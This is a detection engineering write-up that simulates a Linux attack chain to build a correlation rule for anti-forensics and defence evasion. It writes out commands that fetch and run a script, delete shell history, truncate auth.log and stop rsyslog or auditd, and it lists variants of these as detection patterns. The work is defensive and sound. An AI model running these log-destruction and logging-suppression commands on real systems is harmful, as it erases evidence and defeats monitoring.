# Log Tampering and Defence Evasion

## Overview

This detection engineering scenario simulates a Linux-based post-compromise attack sequence where an attacker executes a payload and subsequently attempts to reduce forensic visibility by removing historical evidence, tampering with system logs, and disabling logging services.

The primary objective of this scenario is not malware analysis but detection engineering. The simulation was designed to generate realistic telemetry that can be analyzed, investigated, mapped to known attacker behavior, and ultimately transformed into a behavioral detection.

The scenario demonstrates how multiple low-fidelity events can be correlated into a high-confidence anti-forensics and defense evasion detection.

---

# Scenario Objectives

The scenario was designed to:

* Simulate attacker activity after obtaining shell access.
* Generate realistic Linux telemetry.
* Demonstrate anti-forensics techniques.
* Demonstrate defense evasion techniques.
* Perform end-to-end detection engineering workflow.
* Develop a behavioral detection strategy.
* Validate detection effectiveness against observed activity.

---

# Attack Narrative

An attacker gains access to a Linux host and performs basic reconnaissance to understand the environment.

The attacker downloads an external script into a temporary location, modifies file permissions, and executes the payload. Following successful execution, the attacker attempts to remove traces of activity by deleting shell history, tampering with authentication logs, and disabling the system logging service.

The resulting activity creates a complete behavioral chain spanning:

```text
Discovery
    ↓
Payload Staging
    ↓
Execution
    ↓
Anti-Forensics
    ↓
Defense Evasion
```

---

# Simulation Details

## Phase 1 – Host Discovery

Commands executed:

```bash
whoami
id
hostname
```

Purpose:

* Identify current user.
* Determine privilege level.
* Identify host.

---

## Phase 2 – Local Enumeration

Commands executed:

```bash
ls -la /home/bunny
```

Purpose:

* Inspect user environment.
* Identify available files and directories.

---

## Phase 3 – Payload Retrieval

Commands executed:

```bash
wget http://127.0.0.1:8080/update.sh -O /tmp/update.sh
```

Purpose:

* Simulate ingress tool transfer.
* Stage executable content.

---

## Phase 4 – Payload Preparation

Commands executed:

```bash
chmod +x /tmp/update.sh
```

Purpose:

* Prepare downloaded content for execution.

---

## Phase 5 – Payload Execution

Commands executed:

```bash
bash ./update.sh.1
```

Payload activity:

```bash
date
whoami
hostname
sleep
```

Purpose:

* Simulate automated host profiling.
* Generate parent-child process relationships.
* Produce observable telemetry.

---

## Phase 6 – Historical Evidence Destruction

Commands executed:

```bash
rm ~/.bash_history
```

Purpose:

* Remove interactive command history.

---

## Phase 7 – Log Tampering

Commands executed:

```bash
truncate -s 0 /var/log/auth.log
```

Purpose:

* Destroy authentication records.

---

## Phase 8 – Logging Suppression

Commands executed:

```bash
systemctl stop rsyslog
```

Purpose:

* Prevent future log generation.

---

# Expected Telemetry

The simulation was designed to generate telemetry from multiple sources.

## Auditd

Expected visibility:

* Process creation
* Command execution
* Permission changes
* File modifications
* Service management

---

## Journalctl

Expected visibility:

* Service state transitions
* Logging service shutdown

---

## Tcpdump

Expected visibility:

* HTTP communication
* Payload retrieval
* Beacon-like network activity

---

## HTTP Listener Logs

Expected visibility:

* Payload download requests
* Request timing

---

## Process Trees

Expected visibility:

* Parent-child relationships
* Script execution chains

---

# Collected Telemetry

## Successfully Collected

### Auditd

Captured:

* Discovery commands
* Enumeration activity
* Payload retrieval
* Permission modifications
* Payload execution
* History deletion
* Log tampering
* Logging suppression

Contribution:

Primary source used for attack reconstruction.

---

### Journalctl

Captured:

* rsyslog stop event
* service shutdown confirmation

Contribution:

Validated logging suppression activity.

---

### Tcpdump

Captured:

* HTTP communications
* Download activity

Contribution:

Validated network-based payload delivery.

---

### HTTP Listener Logs

Captured:

* Payload requests
* Download timing

Contribution:

Confirmed successful payload retrieval.

---

### Process Relationship Data

Partially captured through process telemetry.

Original process tree snapshots were not preserved, but process relationships were successfully reconstructed from collected logs.

---

# Investigation Summary

The investigation reconstructed the following attack sequence:

```text
Host Discovery
       ↓
Local Enumeration
       ↓
Payload Retrieval
       ↓
Permission Modification
       ↓
Payload Execution
       ↓
History Removal
       ↓
Authentication Log Tampering
       ↓
Logging Service Shutdown
```

Key findings:

1. External content was introduced onto the host.
2. Downloaded content was prepared for execution.
3. The payload executed successfully.
4. Shell history was removed.
5. Authentication logs were tampered with.
6. Future logging was disabled.

The investigation concluded that the activity represents a coordinated sequence of execution, anti-forensics, and defense evasion.

---

# Threat Mapping Analysis

The observed activity was compared against commonly documented post-compromise attacker behavior.

## Discovery Activity

Observed:

```bash
whoami
id
hostname
```

Assessment:

Consistent with post-compromise host discovery.

---

## Payload Staging

Observed:

```bash
wget
chmod +x
execute
```

Assessment:

Consistent with ingress tool transfer and payload staging.

---

## Anti-Forensics

Observed:

```bash
rm ~/.bash_history
truncate -s 0 /var/log/auth.log
```

Assessment:

Consistent with evidence destruction behavior.

---

## Defense Evasion

Observed:

```bash
systemctl stop rsyslog
```

Assessment:

Consistent with logging suppression techniques.

---

## Overall Assessment

The complete behavioral chain closely resembles known attacker workflows commonly observed after successful code execution on Linux systems.

---

# Detection Strategy

## Detection Objective

Identify activity where a user or process attempts to reduce forensic visibility by:

1. Removing historical evidence.
2. Tampering with logs.
3. Disabling future logging.

---

## Detection Logic

Behavioral sequence:

```text
Historical Evidence Destruction
            ↓
Log Tampering
            ↓
Logging Suppression
```

Observed implementation:

```text
rm ~/.bash_history
            ↓
truncate -s 0 /var/log/auth.log
            ↓
systemctl stop rsyslog
```

The detection focuses on the behavioral objective rather than specific commands.

---

# Sigma Correlation Rule Overview

The detection was implemented as a correlation analytic consisting of three logical stages.

## Stage 1 – Historical Evidence Destruction

Examples:

```bash
rm ~/.bash_history
history -c
unset HISTFILE
```

---

## Stage 2 – Log Tampering

Examples:

```bash
truncate auth.log
rm auth.log
echo "" > auth.log
```

---

## Stage 3 – Logging Suppression

Examples:

```bash
systemctl stop rsyslog
service rsyslog stop
systemctl stop auditd
```

---

## Correlation Logic

```text
History Removal
        ↓
Log Tampering
        ↓
Logging Suppression
```

Conditions:

* Same host
* Same user (when available)
* Within 15 minutes

---

# Key Observations

## Observation 1

Individual anti-forensics events generate moderate confidence.

Examples:

```text
History deletion only
```

or

```text
Log tampering only
```

---

## Observation 2

Confidence increases substantially when visibility reduction behaviors occur together.

Examples:

```text
History Removal
        +
Log Tampering
```

---

## Observation 3

The strongest indicator is a complete visibility reduction chain.

```text
History Removal
        ↓
Log Tampering
        ↓
Logging Suppression
```

---

## Observation 4

The detection remains effective even when individual commands change because it focuses on attacker objectives rather than specific tooling.

---

# Validation Results

| Component               | Result |
| ----------------------- | ------ |
| Telemetry Collection    | PASS   |
| Investigation           | PASS   |
| Threat Mapping          | PASS   |
| Detection Strategy      | PASS   |
| Sigma Correlation Logic | PASS   |
| False Positive Review   | PASS   |

---

# Detection Conclusion

This scenario demonstrates how multiple low-confidence events can be transformed into a high-confidence behavioral detection through correlation.

The simulation successfully generated evidence supporting:

```text
Historical Evidence Destruction
            ↓
Log Tampering
            ↓
Logging Suppression
```

The resulting detection is resilient to tooling changes, focuses on attacker intent rather than individual commands, and provides a strong foundation for detecting Linux anti-forensics and defense evasion activity in operational environments.
